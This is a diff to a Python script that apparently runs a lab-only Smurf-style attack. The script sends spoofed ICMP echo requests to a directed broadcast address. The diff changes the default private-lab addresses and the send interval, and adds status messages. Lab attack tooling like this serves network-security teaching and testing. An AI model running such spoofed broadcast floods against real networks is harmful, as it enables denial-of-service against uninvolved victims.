@@ -70,10 +70,10 @@ def build_ipv4_packet(source: str, destination: str, payload: bytes, packet_id: 
 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Trigger a lab-only Smurf-style attack.")
-    parser.add_argument("--broadcast", default="10.152.0.255", help="directed broadcast address")
-    parser.add_argument("--victim", default="10.151.0.71", help="spoofed victim source address")
+    parser.add_argument("--broadcast", default="10.0.2.255", help="directed broadcast address")
+    parser.add_argument("--victim", default="10.0.3.10", help="spoofed victim source address")
     parser.add_argument("--count", type=int, default=3, help="number of spoofed echo requests")
-    parser.add_argument("--interval", type=float, default=0.2, help="seconds between requests")
+    parser.add_argument("--interval", type=float, default=0.5, help="seconds between requests")
     parser.add_argument("--payload-size", type=int, default=32, help="ICMP payload size in bytes")
     return parser.parse_args()
 
@@ -89,6 +89,13 @@ def main() -> int:
     except PermissionError:
         print("raw socket permission denied; run inside a container with CAP_NET_RAW", file=sys.stderr)
         return 2
+
+    print(f"Starting Smurf attack:")
+    print(f"  Source (spoofed): {args.victim}")
+    print(f"  Destination (broadcast): {args.broadcast}")
+    print(f"  Count: {args.count}")
+    print(f"  Interval: {args.interval}s")
+    print()
 
     for sequence in range(1, args.count + 1):
         icmp = build_icmp_echo(identifier, sequence, args.payload_size)
@@ -106,6 +113,8 @@ def main() -> int:
         if sequence != args.count:
             time.sleep(args.interval)
 
+    print()
+    print("Attack completed!")
     return 0
 
 
